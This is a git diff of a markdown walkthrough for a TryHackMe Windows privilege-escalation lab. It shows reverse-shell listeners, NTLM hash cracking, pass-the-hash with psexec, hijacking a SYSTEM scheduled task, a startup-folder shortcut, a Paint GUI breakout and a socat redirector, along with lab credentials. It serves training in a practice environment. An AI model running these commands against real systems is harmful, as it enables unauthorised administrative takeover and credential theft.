@@ -1,5 +1,7 @@
 # Windows PrivEsc
 
+
+
 **Room Link:** [https://tryhackme.com/r/room/windows10privesc](https://tryhackme.com/r/room/windows10privesc)
 
 ## Generate a Reverse Shell Executable
@@ -38,7 +40,7 @@ copy \\$KALI\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 Test the reverse shell by setting up a netcat listener on Kali:
 
-Kali
+**Kali**
 
 ```
 rlwrap nc -nvlp 54 
@@ -441,13 +443,16 @@ python3 creddump7/pwdump.py SYSTEM SAM
 
 Crack the admin NTLM hash using hashcat:
 
+**Kali**
+
 ```
 hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  --force
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  --show
 ```
 
 You can use the cracked password to log in as the admin using winexe or RDP.
 
-
+<figure><img src="../../.gitbook/assets/image (1226).png" alt=""><figcaption></figcaption></figure>
 
 ## Passwords - Passing the Hash
 
@@ -456,32 +461,43 @@ Why crack a password hash when you can authenticate using the hash?
 Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:
 
 ```
-pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe
+pip3 install impacket --force-reinstall --ignore-installed
+psexec.py -hashes a9fdfa038c4b75ebc76dc855dd74f0da:a9fdfa038c4b75ebc76dc855dd74f0da admin@$VICTIM
 ```
 
-
+<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
 
 ## Scheduled Tasks
 
 View the contents of the C:\DevTools\CleanUp.ps1 script:
 
-
+**Victim**
 
 ```
 type C:\DevTools\CleanUp.ps1
 ```
 
+<figure><img src="../../.gitbook/assets/image (1228).png" alt=""><figcaption></figcaption></figure>
+
 The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:
 
-
+**Victim**
 
 ```
 C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
 ```
 
+<figure><img src="../../.gitbook/assets/image (1229).png" alt=""><figcaption></figcaption></figure>
+
 Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:
 
+**Kali**
 
+```
+rlwrap nc -nvlp 54 
+```
+
+**Victim**
 
 ```
 echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
@@ -489,71 +505,91 @@ echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
 
 Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.
 
+<figure><img src="../../.gitbook/assets/image (1230).png" alt=""><figcaption></figcaption></figure>
+
 ## Insecure GUI Apps
 
 Start an RDP session as the "user" account:
 
-
+**Victim**
 
 ```
-rdesktop -u user -p password321 MACHINE_IP
+xfreerdp +clipboard /u:user /p:password321 /cert:ignore /v:$VICTIM /size:1024x568 
 ```
 
 Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:
 
+<figure><img src="../../.gitbook/assets/image (1231).png" alt=""><figcaption></figcaption></figure>
 
+**Victim**
 
 ```
 tasklist /V | findstr mspaint.exe
 ```
 
+<figure><img src="../../.gitbook/assets/image (1232).png" alt=""><figcaption></figcaption></figure>
+
 In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
+
+<figure><img src="../../.gitbook/assets/image (1233).png" alt=""><figcaption></figcaption></figure>
 
 Press Enter to spawn a command prompt running with admin privileges.
 
-
+<figure><img src="../../.gitbook/assets/image (1234).png" alt=""><figcaption></figcaption></figure>
 
 ## Startup Apps
 
 Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:
 
+**Victim**
+
 ```
 C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 ```
 
-
+<figure><img src="../../.gitbook/assets/image (1236).png" alt=""><figcaption></figcaption></figure>
 
 Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
 
-
+**Victim**
 
 ```
 cscript C:\PrivEsc\CreateShortcut.vbs
 ```
 
+<figure><img src="../../.gitbook/assets/image (1237).png" alt=""><figcaption></figcaption></figure>
+
 Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:
 
-
+**Kali**
 
 ```
-rdesktop -u admin MACHINE_IP
+rlwrap nc -nvlp 54 
+```
+
+**Victim**
+
+```
+xfreerdp +clipboard /u:admin /p:password321 /cert:ignore /v:$VICTIM /size:1024x568 
 ```
 
 A shell running as admin should connect back to your listener.
+
+<figure><img src="../../.gitbook/assets/image (1238).png" alt=""><figcaption></figcaption></figure>
 
 ## Token Impersonation - Rogue Potato
 
 Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:
 
-
+**Kali**
 
 ```
-sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
+sudo socat tcp-listen:135,reuseaddr,fork tcp:$VICTIM:9999
 ```
 
 Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:
 
-
+**Victim**
 
 ```
 C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
